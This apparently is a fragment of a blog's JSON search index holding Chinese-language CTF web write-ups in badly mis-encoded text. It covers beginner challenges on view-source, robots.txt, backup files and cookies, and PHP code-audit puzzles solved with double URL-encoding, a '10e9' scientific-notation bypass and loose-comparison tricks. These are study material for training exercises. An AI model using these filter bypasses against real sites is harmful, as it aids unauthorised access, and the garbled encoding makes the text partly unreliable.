ï¼šaè¦ç­‰äº0ï¼Œåˆä¸èƒ½ç­‰äº0ï¼›bä¸èƒ½æ˜¯æ•°å­—ï¼Œä½†è¿˜è¦å¤§äº1234 is_numericï¼ˆï¼‰æ¥å‡½æ•°ç”¨äºæ£€æµ‹å˜é‡æ˜¯å¦ä¸ºæ•°å­—æˆ–æ•°å­—å­—ç¬¦ä¸²ã€‚å¦‚æœæŒ‡å®šçš„å˜é‡æ˜¯æ•°å­—å’Œæ•°å­—å­—ç¬¦ä¸²åˆ™è¿”å›TRUEï¼Œå¦åˆ™è¿”å›FALSEã€‚ æ­¤å¤„é phpå¼±ç±»å‹æ¯”è¾ƒï¼šå¯æŸ¥çœ‹æˆ‘çš„è¿™ç¯‡åšæ–‡æ„é€ å¦‚ä¸‹url:","categories":[{"name":"CTF","slug":"CTF","permalink":"https://singlemindedt.github.io/categories/CTF/"},{"name":"Web","slug":"CTF/Web","permalink":"https://singlemindedt.github.io/categories/CTF/Web/"}],"tags":[{"name":"Web","slug":"Web","permalink":"https://singlemindedt.github.io/tags/Web/"}]},{"title":"Images","slug":"images","date":"2019-09-04T09:37:45.000Z","updated":"2019-09-05T14:33:05.157Z","comments":true,"path":"2019/09/04/images/","link":"","permalink":"https://singlemindedt.github.io/2019/09/04/images/","excerpt":"","text":"Inset demo â€¦","categories":[],"tags":[]},{"title":"æ”»é˜²ä¸–ç•Œä¹‹Webæ–°æ‰‹ï¼ˆ1-6ï¼‰","slug":"æ”»é˜²ä¸–ç•Œä¹‹Webæ–°æ‰‹ï¼ˆ1-6ï¼‰","date":"2019-09-04T07:11:48.415Z","updated":"2019-12-30T03:22:38.168Z","comments":true,"path":"2019/09/04/æ”»é˜²ä¸–ç•Œä¹‹Webæ–°æ‰‹ï¼ˆ1-6ï¼‰/","link":"","permalink":"https://singlemindedt.github.io/2019/09/04/æ”»é˜²ä¸–ç•Œä¹‹Webæ–°æ‰‹ï¼ˆ1-6ï¼‰/","excerpt":"","text":"[TOC] view_sourceé¢˜ç›®æè¿°ï¼šXè€å¸ˆè®©å°å®åŒå­¦æŸ¥çœ‹ä¸€ä¸ªç½‘é¡µçš„æºä»£ç ï¼Œä½†å°å®åŒå­¦å‘ç°é¼ æ ‡å³é”®å¥½åƒä¸ç®¡ç”¨äº†ã€‚æ‰“å¼€é“¾æ¥å¦‚ä¸‹ï¼š view0 æ–¹æ³•1è¯•è¯•å³é”®çš„ç¡®ä¸ç®¡ç”¨äº†ï¼Œç›´æ¥F12ï¼Œæ‰¾åˆ°flag æ–¹æ³•2å¦å¤–è¿˜å¯ä»¥é€šè¿‡view-sourceï¼šurlæŸ¥çœ‹æºä»£ç ï¼š æ–¹æ³•3å…¶å®è¿˜å¯ä»¥ç¦ç”¨Jsä»£ç ï¼Œè¿™æ ·å³é”®å°±å¯ä»¥ç”¨äº†ï¼š get_posté¢˜ç›®æè¿°ï¼šXè€å¸ˆå‘Šè¯‰å°å®åŒå­¦HTTPé€šå¸¸ä½¿ç”¨ä¸¤ç§è¯·æ±‚æ–¹æ³•ï¼Œä½ çŸ¥é“æ˜¯å“ªä¸¤ç§å—ï¼Ÿ çŸ¥è¯†è¡¥å……ï¼šä¸¤ç§ HTTP è¯·æ±‚æ–¹æ³•ï¼šGET å’Œ POSTåœ¨å®¢æˆ·æœºå’ŒæœåŠ¡å™¨ä¹‹é—´è¿›è¡Œè¯·æ±‚-å“åº”æ—¶ï¼Œä¸¤ç§æœ€å¸¸è¢«ç”¨åˆ°çš„æ–¹æ³•æ˜¯ï¼šGET å’Œ 12345POSTã€‚&#123;GET - ä»æŒ‡å®šçš„èµ„æºè¯·æ±‚æ•°æ®ã€‚POST - å‘æŒ‡å®šçš„èµ„æºæäº¤è¦è¢«å¤„ç†çš„æ•°æ®&#125; https://www.w3school.com.cn/tags/html_ref_httpmethods.asp https://baijiahao.baidu.com/s?id=1620934682611653374&amp;wfr=spider&amp;for=pc å®é™…æ“ä½œï¼šæ‰“å¼€ç½‘å€ï¼Œå¾—åˆ°å¦‚ä¸‹è¦æ±‚ &lt;ç”¨GETç»™åç«¯ä¼ å‚çš„æ–¹æ³•æ˜¯ï¼šåœ¨?åè·Ÿå˜é‡åå­—ï¼Œä¸åŒçš„å˜é‡ä¹‹é—´ç”¨&amp;éš”å¼€&gt;åœ¨urlåæ·»åŠ /ï¼Ÿa=1å³å¯å‘é€getè¯·æ±‚ã€‚ åˆ©ç”¨hackbarè¿›è¡ŒPOSTä¼ å‚ï¼šå¤åˆ¶getçš„urlï¼Œé€‰æ‹©postdataï¼Œå¡«å…¥b=2ï¼Œé€‰æ‹©executeã€‚å³å¯å‘é€POSTè¯·æ±‚ã€‚ å…³äºGET å’Œ POSTï¼šhttps://www.cnblogs.com/williamjie/p/9099940.html Robotsé¢˜ç›®æè¿°ï¼šXè€å¸ˆä¸Šè¯¾è®²äº†Robotsåè®®ï¼Œå°å®åŒå­¦å´ä¸Šè¯¾æ‰“äº†çŒç¡ï¼Œèµ¶ç´§æ¥æ•™æ•™å°å®Robotsåè®®æ˜¯ä»€ä¹ˆå§ã€‚ çŸ¥è¯†è¡¥å……ï¼š robots.txtæ˜¯æœç´¢å¼•æ“ä¸­è®¿é—®ç½‘ç«™çš„æ—¶å€™è¦æŸ¥çœ‹çš„ç¬¬ä¸€ä¸ªæ–‡ä»¶ã€‚robots.txtæ–‡ä»¶å‘Šè¯‰èœ˜è››ç¨‹åºåœ¨æœåŠ¡å™¨ä¸Šä»€ä¹ˆæ–‡ä»¶æ˜¯å¯ä»¥è¢«æŸ¥çœ‹çš„ã€‚ å½“ä¸€ä¸ªæœç´¢èœ˜è››è®¿é—®ä¸€ä¸ªç«™ç‚¹æ—¶ï¼Œå®ƒä¼šé¦–å…ˆæ£€æŸ¥è¯¥ç«™ç‚¹æ ¹ç›®å½•ä¸‹æ˜¯å¦å­˜åœ¨robots.txtï¼Œå¦‚æœå­˜åœ¨ï¼Œæœç´¢æœºå™¨äººå°±ä¼šæŒ‰ç…§è¯¥æ–‡ä»¶ä¸­çš„å†…å®¹æ¥ç¡®å®šè®¿é—®çš„èŒƒå›´ï¼›å¦‚æœè¯¥æ–‡ä»¶ä¸å­˜åœ¨ï¼Œæ‰€æœ‰çš„æœç´¢èœ˜è››å°†èƒ½å¤Ÿè®¿é—®ç½‘ç«™ä¸Šæ‰€æœ‰æ²¡æœ‰è¢«å£ä»¤ä¿æŠ¤çš„é¡µé¢ã€‚ç™¾åº¦å®˜æ–¹å»ºè®®ï¼Œä»…å½“æ‚¨çš„ç½‘ç«™åŒ…å«ä¸å¸Œæœ›è¢«æœç´¢å¼•æ“æ”¶å½•çš„å†…å®¹æ—¶ï¼Œæ‰éœ€è¦ä½¿ç”¨robots.txtæ–‡ä»¶ã€‚å¦‚æœæ‚¨å¸Œæœ›æœç´¢å¼•æ“æ”¶å½•ç½‘ç«™ä¸Šæ‰€æœ‰å†…å®¹ï¼Œè¯·å‹¿å»ºç«‹robots.txtæ–‡ä»¶ã€‚ å¦‚æœå°†ç½‘ç«™è§†ä¸ºé…’åº—é‡Œçš„ä¸€ä¸ªæˆ¿é—´ï¼Œrobots.txtå°±æ˜¯ä¸»äººåœ¨æˆ¿é—´é—¨å£æ‚¬æŒ‚çš„â€œè¯·å‹¿æ‰“æ‰°â€æˆ–â€œæ¬¢è¿æ‰“æ‰«â€çš„æç¤ºç‰Œã€‚è¿™ä¸ªæ–‡ä»¶å‘Šè¯‰æ¥è®¿çš„æœç´¢å¼•æ“å“ªäº›æˆ¿é—´å¯ä»¥è¿›å…¥å’Œå‚è§‚ï¼Œå“ªäº›æˆ¿é—´å› ä¸ºå­˜æ”¾è´µé‡ç‰©å“ï¼Œæˆ–å¯èƒ½æ¶‰åŠä½æˆ·åŠè®¿å®¢çš„éšç§è€Œä¸å¯¹æœç´¢å¼•æ“å¼€æ”¾ã€‚ä½†robots.txtä¸æ˜¯å‘½ä»¤ï¼Œä¹Ÿä¸æ˜¯é˜²ç«å¢™ï¼Œå¦‚åŒå®ˆé—¨äººæ— æ³•é˜»æ­¢çªƒè´¼ç­‰æ¶æ„é—¯å…¥è€…ã€‚ Robotsåè®®ç”¨æ¥å‘ŠçŸ¥æœç´¢å¼•æ“å“ªäº›é¡µé¢èƒ½è¢«æŠ“å–ï¼Œå“ªäº›é¡µé¢ä¸èƒ½è¢«æŠ“å–ï¼›å¯ä»¥å±è”½ä¸€äº›ç½‘ç«™ä¸­æ¯”è¾ƒå¤§çš„æ–‡ä»¶ï¼Œå¦‚ï¼šå›¾ç‰‡ï¼ŒéŸ³ä¹ï¼Œè§†é¢‘ç­‰ï¼ŒèŠ‚çœæœåŠ¡å™¨å¸¦å®½ï¼›å¯ä»¥å±è”½ç«™ç‚¹çš„ä¸€äº›æ­»é“¾æ¥ã€‚æ–¹ä¾¿æœç´¢å¼•æ“æŠ“å–ç½‘ç«™å†…å®¹ï¼›è®¾ç½®ç½‘ç«™åœ°å›¾è¿æ¥ï¼Œæ–¹ä¾¿å¼•å¯¼èœ˜è››çˆ¬å–é¡µé¢ã€‚ã€https://blog.csdn.net/qq_40491569/article/details/83473703ã€‘ å®é™…æ“ä½œï¼šæ‰“å¼€ç½‘é¡µç©ºç™½ï¼› åœ¨é¢˜URLåè¾“å…¥/robots.txtå³ï¼š http://111.198.29.45:35567/robots.txt f1ag_1s_h3re.phpè¿™ä¸ªé¡µé¢ä¸å…è®¸è¢«çˆ¬å–ï¼ŒæŸ¥çœ‹ä¸€ä¸‹f1ag_1s_h3re.phpé¡µé¢å¾—åˆ°flag. Backupé¢˜ç›®æè¿°ï¼šXè€å¸ˆå¿˜è®°åˆ é™¤å¤‡ä»½æ–‡ä»¶ï¼Œä»–æ´¾å°å®åŒå­¦å»æŠŠå¤‡ä»½æ–‡ä»¶æ‰¾å‡ºæ¥,ä¸€èµ·æ¥å¸®å°å®åŒå­¦å§ï¼ çŸ¥è¯†è¡¥å……å¤‡ä»½æ–‡ä»¶: bakï¼ˆè¢«è‡ªåŠ¨æˆ–æ˜¯é€šè¿‡å‘½ä»¤åˆ›å»ºçš„è¾…åŠ©æ–‡ä»¶ï¼Œå®ƒåŒ…å«æŸä¸ªæ–‡ä»¶çš„æœ€è¿‘ä¸€ä¸ªç‰ˆæœ¬ï¼‰ å®é™…æ“ä½œè¯•ç€åœ¨index.phpååŠ .bakå¾—åˆ°index.php.bakçš„å¤‡ä»½æ–‡ä»¶ï¼Œæ‰“å¼€å¾—åˆ°flag CookieçŸ¥è¯†è¡¥å……ï¼š Cookie å¯ä»¥ç¿»è¯‘ä¸ºâ€œå°ç”œå“ï¼Œå°é¥¼å¹²â€ï¼ŒCookie åœ¨ç½‘ç»œç³»ç»Ÿä¸­å‡ ä¹æ— å¤„ä¸åœ¨ï¼Œå½“æˆ‘ä»¬æµè§ˆä»¥å‰è®¿é—®è¿‡çš„ç½‘ç«™æ—¶ï¼Œç½‘é¡µä¸­å¯èƒ½ä¼šå‡ºç° ï¼šä½ å¥½ XXXï¼Œè¿™ä¼šè®©æˆ‘ä»¬æ„Ÿè§‰å¾ˆäº²åˆ‡ï¼Œå°±å¥½åƒåƒäº†ä¸€ä¸ªå°ç”œå“ä¸€æ ·ã€‚è¿™å…¶å®æ˜¯é€šè¿‡è®¿é—®ä¸»æœºä¸­çš„ä¸€ä¸ªæ–‡ä»¶æ¥å®ç°çš„ï¼Œè¿™ä¸ªæ–‡ä»¶å°±æ˜¯ Cookieã€‚åœ¨ Internet ä¸­ï¼ŒCookie å®é™…ä¸Šæ˜¯æŒ‡å°é‡ä¿¡æ¯ï¼Œæ˜¯ç”±WebæœåŠ¡å™¨åˆ›å»ºçš„ï¼Œå°†ä¿¡æ¯å­˜å‚¨åœ¨ç”¨æˆ·è®¡ç®—æœºä¸Šçš„æ–‡ä»¶ã€‚ä¸€èˆ¬ç½‘ç»œç”¨æˆ·ä¹ æƒ¯ç”¨å…¶å¤æ•°å½¢å¼ Cookiesï¼ŒæŒ‡æŸäº›ç½‘ç«™ä¸ºäº†è¾¨åˆ«ç”¨æˆ·èº«ä»½ã€è¿›è¡ŒSession è·Ÿè¸ªè€Œå­˜å‚¨åœ¨ç”¨æˆ·æœ¬åœ°ç»ˆç«¯ä¸Šçš„æ•°æ®ï¼Œè€Œè¿™äº›æ•°æ®é€šå¸¸ä¼šç»è¿‡åŠ å¯†å¤„ç†ã€‚å…¶å®cookiesæ˜¯ç”±ç½‘ç»œæœåŠ¡å™¨å­˜å‚¨åœ¨ä½ ç”µè„‘ç¡¬ç›˜ä¸Šçš„ä¸€ä¸ªtxtç±»å‹çš„å°æ–‡ä»¶ï¼Œå®ƒå’Œä½ çš„ç½‘ç»œæµè§ˆè¡Œä¸ºæœ‰å…³ï¼Œæ‰€ä»¥å­˜å‚¨åœ¨ä½ ç”µè„‘ä¸Šçš„cookieså°±å¥½åƒä½ çš„ä¸€å¼ èº«ä»½è¯ï¼Œä½ ç”µè„‘ä¸Šçš„cookieså’Œå…¶ä»–ç”µè„‘ä¸Šçš„cookiesæ˜¯ä¸ä¸€æ ·çš„;cookiesä¸èƒ½è¢«è§†ä½œä»£ç æ‰§è¡Œï¼Œä¹Ÿä¸èƒ½æˆä¸ºç—…æ¯’ï¼Œæ‰€ä»¥å®ƒå¯¹ä½ åŸºæœ¬æ— å®³ã€‚cookiesçš„ä½œç”¨ä¸»è¦æ˜¯ï¼Œå½“ä½ è®¿é—®äº†æŸäº›ç½‘é¡µï¼Œå¹¶ä¸”å¯¹ç½‘é¡µçš„ä¸€äº›è®¾ç½®è¿›è¡Œä¿®æ”¹ï¼Œcookieså°±èƒ½è·Ÿè¸ªå¹¶è®°å½•åˆ°è¿™äº›ä¿®æ”¹ï¼Œå½“ä½ ä¸‹ä¸€æ¬¡è®¿é—®è¿™ä¸ªç½‘é¡µçš„æ—¶å€™ï¼Œè¿™ä¸ªç½‘é¡µä¼šåˆ†æä½ ç”µè„‘ä¸Šçš„cookiesï¼Œè¿›è€Œé‡‡å–æªæ–½åƒä½ è¿”å›æ›´ç¬¦åˆä½ ä¸ªæ€§åŒ–çš„ç½‘é¡µ; å½“ç„¶ï¼Œç›®å‰å¤§éƒ¨åˆ†å¹¿å‘Šçš„å®šä½åŸºç¡€ä¹Ÿæ˜¯åŸºäºcookiesçš„ï¼Œæ¯”å¦‚ä½ æ­¤å‰è®¿é—®äº†å¤§é‡çš„å¥èº«ç±»ç½‘ç«™ï¼Œcookiesè®°å½•äº†ä½ çš„è®¿é—®è¡Œä¸ºï¼Œå¹¿å‘Šä¸»å°±èƒ½å¤Ÿæ ¹æ®ä½ çš„è®¿é—®è¡Œä¸ºï¼Œå‘ä½ æ¨é€å¥èº«ç±»çš„å¹¿å‘Šã€‚ å®é™…æ“ä½œï¼šåˆ©ç”¨å¼€å‘è€…å·¥å…·F12é”®â€”ç½‘ç»œï¼ŒæŸ¥çœ‹æ¶ˆæ¯å¤´çœ‹åˆ°â€œCookie look-here=cookie.phpâ€ æ ¹æ®æç¤ºä¿¡æ¯ï¼Œåœ¨URLååŠ ä¸Šâ€/cookie.phpâ€å³http://111.198.29.45:47420/cookie.php æç¤ºæŸ¥çœ‹HTTPå“åº”ï¼Œåœ¨æ¶ˆæ¯å¤´é‡Œå‘ç°flagã€‚ disabled_buttoné¢˜ç›®æè¿°ï¼šXè€å¸ˆä»Šå¤©ä¸Šè¯¾è®²äº†å‰ç«¯çŸ¥è¯†ï¼Œç„¶åç»™äº†å¤§å®¶ä¸€ä¸ªä¸èƒ½æŒ‰çš„æŒ‰é’®ï¼Œå°å®æƒŠå¥‡åœ°å‘ç°è¿™ä¸ªæŒ‰é’®æŒ‰ä¸ä¸‹å»ï¼Œåˆ°åº•æ€ä¹ˆæ‰èƒ½æŒ‰ä¸‹å»å‘¢ï¼Ÿ çŸ¥è¯†è¡¥å……ï¼šéœ€è¦ç†Ÿæ‚‰ä¸€äº›å¸¸è§çš„HTMLçŸ¥è¯† å®é™…æ“ä½œï¼šå³é”®-&gt;æŸ¥çœ‹å…ƒç´ ï¼Œåœ¨inputä¸­ç”¨äº†â€˜disabled=â€ â€œâ€™å±æ€§ï¼ŒåŒå‡»ï¼Œå°†å…¶åˆ æ‰ï¼ŒæŒ‰é’®ä¾¿å¯æ­£å¸¸ä½¿ç”¨ã€‚","categories":[{"name":"CTF","slug":"CTF","permalink":"https://singlemindedt.github.io/categories/CTF/"},{"name":"Web","slug":"CTF/Web","permalink":"https://singlemindedt.github.io/categories/CTF/Web/"}],"tags":[{"name":"Web","slug":"Web","permalink":"https://singlemindedt.github.io/tags/Web/"}]},{"title":"ä»£ç å®¡è®¡","slug":"ä»£ç å®¡è®¡ONE","date":"2019-09-03T14:35:18.000Z","updated":"2019-09-04T08:46:22.694Z","comments":true,"path":"2019/09/03/ä»£ç å®¡è®¡ONE/","link":"","permalink":"https://singlemindedt.github.io/2019/09/03/ä»£ç å®¡è®¡ONE/","excerpt":"","text":"PHPå¤§æ³•ï¼ˆæ¥æºï¼šå®éªŒå§ è§£é¢˜é“¾æ¥ï¼š http://ctf5.shiyanbar.com/DUTCTF/index.phpï¼‰ç‚¹å¼€é“¾æ¥åªæœ‰å¦‚ä¸Šä¸€å¥è¯ã€‚æ ¹æ®æç¤º ç›´æ¥è®¿é—®ï¼š index.php.txt ï¼ˆå³ï¼šhttp://ctf5.shiyanbar.com/DUTCTF/index.php.txtï¼‰å¾—åˆ°å¦‚ä¸‹é¡µé¢ï¼šåˆ†æä»£ç ï¼š 1234567891011121314151617 &lt;?php if(eregi(\"hackerDJ\",$_GET[id])) &#123; //å¯¹idè¿›è¡Œå­—ç¬¦ä¸²åŒ¹é…ï¼Œè‹¥$_GET[id]ä¸­æœ‰hacker DJåˆ™ //å‡ºnot allowed!å¹¶ç»ˆæ­¢æ­£åœ¨æ‰§è¡Œçš„è¿›ç¨‹; echo(\"&lt;p&gt;not allowed!&lt;/p&gt;\"); exit(); &#125; $_GET[id] = urldecode($_GET[id]); //urldecodeå¯¹å­—ç¬¦ä¸²è¿›è¡ŒURLè§£ç ;å°†è§£ç åçš„//$_GET[id]èµ‹å€¼ç»™$_GET[id]; if($_GET[id] == \"hackerDJ\") //è‹¥$_GET[id]çš„å€¼ç­‰äºhackerDJï¼Œè¾“å‡ºAccess granted! //å¹¶ç»™å‡ºflag: *****************&#125; &#123; echo \"&lt;p&gt;Access granted!&lt;/p&gt;\"; echo \"&lt;p&gt;flag: *****************&#125; &lt;/p&gt;\"; &#125; ?&gt;&lt;br&gt;&lt;br&gt;Can you authenticate to this website? 12345678$_GETè¯´æ˜é€šè¿‡ URL å‚æ•°ä¼ é€’ç»™å½“å‰è„šæœ¬çš„å˜é‡çš„æ•°ç»„Example #1$_GETèŒƒä¾‹ &lt;?php echo 'Hello ' . htmlspecialchars($_GET[\"name\"]) . '!'; ?&gt;å‡è®¾ç”¨æˆ·è®¿é—®çš„æ˜¯ http://example.com/?name=Hannesä»¥ä¸Šä¾‹ç¨‹çš„è¾“å‡ºç±»ä¼¼äºï¼š Hello Hannes! è§£é¢˜æ€è·¯ï¼šæœ‰$_GET[id] æ‰€ä»¥åº”è¯¥æ˜¯å¯ä»¥ç”¨ ?id= æ¥æ„é€ URLidå˜é‡æ˜¯ä¸€ä¸ªurlè§£ç å‡½æ•°å‰ä¸åŒ…å«hackerDJï¼Œurlè§£ç å‡½æ•°åä¸ºhackerDJçš„å˜é‡ï¼Œå³idåœ¨è¿›å…¥urlè§£ç å‡½æ•°å‰å¿…é¡»æ˜¯hackerDJçš„urlç¼–ç å½¢å¼ æ³¨æ„ï¼šç”±äºåœ¨æµè§ˆå™¨è¾“å…¥urlåä¼šè¿›è¡Œä¸€æ¬¡decodeï¼Œè¿™æ®µä»£ç ä¸­åˆè¿›è¡Œä¸€æ¬¡decodeï¼Œæ‰€ä»¥åº”å¯¹hackerDJè¿›è¡Œä¸¤æ¬¡encodeã€‚åªè¿›è¡Œä¸€æ¬¡encodeï¼Œæµè§ˆå™¨è‡ªåŠ¨è§£ç åå³ä¸ºhackerDJ,è¢«eregi()æ‹¦ä½ï¼Œæ‰€ä»¥è¦è¿›è¡ŒäºŒæ¬¡ç¼–ç ï¼Œå³å¯¹%68%61%63%6B%65%72%44%4Aè¿›è¡Œurlç¼–ç ã€‚ â‘  http://ctf5.shiyanbar.com/DUTCTF/index.php?id=%68%61%63%6B%65%72%44%4A â‘¡ http://ctf5.shiyanbar.com/DUTCTF/index.php?id=%25%36%38%25%36%31%25%36%33%25%36%42%25%36%35%25%37%32%25%34%34%25%34%41 æˆ–è€…ç›´æ¥å¯¹å…¶ä¸­çš„ä¸€ä¸ªå­—æ¯è¿›è¡ŒäºŒæ¬¡ç¼–ç ï¼š h â€“&gt; %68 â€“&gt; %2568æ„é€ url: index.php?id=%2568ackerDJ Very easyæ‰“å¼€é“¾æ¥ç›´æ¥å¾—åˆ°å¦‚ä¸‹ä»£ç ï¼š 1234$what=$_GET['what'];echo $what;if($what=='flag')echo 'flag&#123;****&#125;'; åˆ†æï¼šå¦‚æœ$whatç­‰äºflag,åˆ™ç»™å‡ºflagã€‚è§£å†³ï¼šhttp://123.206.87.240:8002/get/?what=flag å¾—åˆ°flagã€‚ Experiment 1æ‰“å¼€é“¾æ¥ç›´æ¥å‡ºç°PHPä»£ç ï¼š 123456789101112131415&lt;?php include \"flag.php\"; highlight_file(__FILE__); if (isset($_GET['money'])) &#123; $money=$_GET['money']; if(strlen($money)&lt;=4&amp;&amp;$money&gt;time()&amp;&amp;!is_array($money)) &#123; echo $flag; echo \"&lt;!--By:daoyuan--&gt;\"; &#125; else echo \"Wrong Answer!\"; &#125; else echo \"Wrong Answer!\";?&gt; ä»£ç åˆ†æï¼šç¬¬ä¸€è¡Œ:å‘Šè¯‰æˆ‘ä»¬flagåº”è¯¥å°±åœ¨flag.phpä¸­ç¬¬äºŒè¡Œï¼šhighlight_file() å‡½æ•°å¯¹æ–‡ä»¶è¿›è¡Œ PHP è¯­æ³•é«˜äº®æ˜¾ç¤ºã€‚è¯­æ³•é€šè¿‡ä½¿ç”¨ HTML æ ‡ç­¾è¿›è¡Œé«˜äº®ã€‚ æç¤ºï¼šç”¨äºé«˜äº®çš„é¢œè‰²å¯é€šè¿‡ php.ini æ–‡ä»¶è¿›è¡Œè®¾ç½®æˆ–è€…é€šè¿‡è°ƒç”¨ ini_set() å‡½æ•°è¿›è¡Œè®¾ç½®ã€‚ æ³¨é‡Šï¼šå½“ä½¿ç”¨è¯¥å‡½æ•°æ—¶ï¼Œæ•´ä¸ªæ–‡ä»¶éƒ½å°†è¢«æ˜¾ç¤ºï¼ŒåŒ…æ‹¬å¯†ç å’Œå…¶ä»–æ•æ„Ÿä¿¡æ¯ï¼ è¯­æ³•ï¼šhighlight_file(filename,return)filename å¿…éœ€ã€‚è§„å®šè¦æ˜¾ç¤ºçš„æ–‡ä»¶ã€‚return å¯é€‰ã€‚å¦‚æœè¯¥å‚æ•°è®¾ç½®ä¸º TRUEï¼Œè¯¥å‡½æ•°å°†ä»¥å­—ç¬¦ä¸²å½¢å¼è¿”å›é«˜äº®æ˜¾ç¤ºçš„ä»£ç ï¼Œè€Œä¸æ˜¯ç›´æ¥è¿›è¡Œè¾“å‡ºã€‚é»˜è®¤æ˜¯ FALSEã€‚è¿”å›å€¼å¦‚æœ return å‚æ•°è®¾ç½®ä¸º TRUEï¼Œè¯¥å‡½æ•°å°†ä»¥å­—ç¬¦ä¸²å½¢å¼è¿”å›é«˜äº®æ˜¾ç¤ºçš„ä»£ç ï¼Œè€Œä¸æ˜¯ç›´æ¥è¿›è¡Œè¾“å‡ºã€‚å¦åˆ™ï¼Œå¦‚æœæˆåŠŸåˆ™è¿”å› TRUEï¼Œå¦‚æœå¤±è´¥åˆ™è¿”å› FALSEã€‚Ifæ¡ä»¶ï¼š$moneyçš„é•¿åº¦&lt;=4ï¼›åŒæ—¶&gt;time()ï¼›åŒæ—¶ä¸æ˜¯æ•°ç»„{time() å‡½æ•°è¿”å›è‡ª Unix çºªå…ƒï¼ˆJanuary 1 1970 00:00:00 GMTï¼‰èµ·çš„å½“å‰æ—¶é—´çš„ç§’æ•°ã€‚æ­¤å¤„æˆ‘ä»¬ç›´æ¥å°†å…¶ç†è§£ä¸ºä¸€ä¸ªå¾ˆå¤§çš„æ•°}==PHPä¸­ï¼Œå­—ç¬¦ä¸²å¼€å¤´ä»¥xexå¼€å¤´ï¼Œxä»£è¡¨æ•°å­—ã€‚ä¼šè¢«è½¬æ¢æˆç§‘å­¦è®¡æ•°æ³•ã€‚ å¦‚1e9 == 1Ã—10^9==è§£å†³ï¼šç›´æ¥ç”¨xexæ ¼å¼å¦‚ï¼šhttp://119.23.73.3:5001/web6/?money=10e9 ç›´æ¥å¾—åˆ°flag Experiment 2æ‰“å¼€é“¾æ¥é¡µé¢ä¸­åªæœ‰ä¸€å¥è¯â€œå¥½åƒå°‘äº†ç‚¹ä»€ä¹ˆâ€ï¼Œè¯•ç€åœ¨urlåæ·»åŠ index.php~å³http://119.23.73.3:5001/web5/index.php~ã€‚æ‰“å¼€é¡µé¢å‘ç°ä»€ä¹ˆéƒ½æ²¡æœ‰ï¼ŒæŸ¥çœ‹æºæ–‡ä»¶å‘ç°æœç„¶æœ‰PHPæ–‡ä»¶ï¼š åˆ†æä»£ç ï¼š9ï¼šç»™å‡º$flagçš„å€¼ä¸ºæˆ‘ä»¬æœ€ç»ˆéœ€è¦çš„ç»“æœ 1moctf&#123;**************&#125; 11ï¼š{PHPçš„isset()å‡½æ•° ä¸€èˆ¬ç”¨æ¥æ£€æµ‹å˜é‡æ˜¯å¦è®¾ç½®æ ¼å¼ï¼šbool isset ( mixed var [, mixed var [, â€¦]] )åŠŸèƒ½ï¼šæ£€æµ‹å˜é‡æ˜¯å¦è®¾ç½®è¿”å›å€¼ï¼šè‹¥å˜é‡ä¸å­˜åœ¨åˆ™è¿”å› FALSEè‹¥å˜é‡å­˜åœ¨ä¸”å…¶å€¼ä¸ºNULLï¼Œä¹Ÿè¿”å› FALSEè‹¥å˜é‡å­˜åœ¨ä¸”å€¼ä¸ä¸ºNULLï¼Œåˆ™è¿”å› TUREåŒæ—¶æ£€æŸ¥å¤šä¸ªå˜é‡æ—¶ï¼Œæ¯ä¸ªå•é¡¹éƒ½ç¬¦åˆä¸Šä¸€æ¡è¦æ±‚æ—¶æ‰è¿”å› TRUEï¼Œå¦åˆ™ç»“æœä¸º FALSEç‰ˆæœ¬ï¼šPHP 3, PHP 4, PHP 5æ›´å¤šè¯´æ˜ï¼šä½¿ç”¨ unset() é‡Šæ”¾å˜é‡ä¹‹åï¼Œå®ƒå°†ä¸å†æ˜¯ isset()ã€‚PHPå‡½æ•°isset()åªèƒ½ç”¨äºå˜é‡ï¼Œä¼ é€’ä»»ä½•å…¶å®ƒå‚æ•°éƒ½å°†é€ æˆè§£æé”™è¯¯ã€‚æ£€æµ‹å¸¸é‡æ˜¯å¦å·²è®¾ç½®å¯ä½¿ç”¨ defined() å‡½æ•°ã€‚} 1234Ifæ¡ä»¶ä¸‹å¯¹å˜é‡$_GET['a']å’Œ$_GET['b']èµ‹å€¼ï¼Œå¹¶å°†å…¶èµ‹å€¼ç»™$a,$b.è‹¥$aç­‰äº$båˆ™æ‰“å°Wrong Answer!å¦åˆ™åœ¨æ¡ä»¶md5($a)==md5($b)ä¸‹ç»™å‡º$flagï¼Œå¦åˆ™æ‰“å°Wrong Answerï¼**å³æ­¤ä»£ç çš„æ„æ€æ—¶è¦æˆ‘ä»¬å¯¹æä¾›$a,$bä½¿å¾—å…¶å€¼ä¸åŒï¼Œä½†MD5å€¼ç›¸åŒã€‚** ***å¼±ç±»å‹æ¯”è¾ƒâ€”â€”â€œ==â€ç±»å‹è½¬æ¢çš„è§„åˆ™1ã€å­—ç¬¦ä¸²å’Œæ•°å­—æ¯”è¾ƒï¼Œå­—ç¬¦ä¸²ä¼šè¢«è½¬æ¢æˆæ•°å­—ã€‚ â€œadminâ€==0 (true) adminè¢«è½¬æ¢æˆæ•°å­—ï¼Œç”±äºadminæ˜¯å­—ç¬¦ä¸²ï¼Œè½¬æ¢å¤±è´¥ï¼Œint(admin)=0ï¼Œæ‰€ä»¥ æ¯”è¾ƒç»“æœæ˜¯trueã€‚2ã€æ··åˆå­—ç¬¦ä¸²è½¬æ¢æˆæ•°å­—ï¼Œçœ‹å­—ç¬¦ä¸²çš„ç¬¬ä¸€ä¸ªã€‚ â€œ1adminâ€==1 â€œ2adminâ€==23ã€å­—ç¬¦ä¸²å¼€å¤´ä»¥xexå¼€å¤´ï¼Œxä»£è¡¨æ•°å­—ã€‚ä¼šè¢«è½¬æ¢æˆç§‘å­¦è®¡æ•°æ³•ã€‚ 1e9 == 1Ã—10^9 æ³¨ï¼š 12\"admin1\"==1 //false\"admin1\"==0 //true 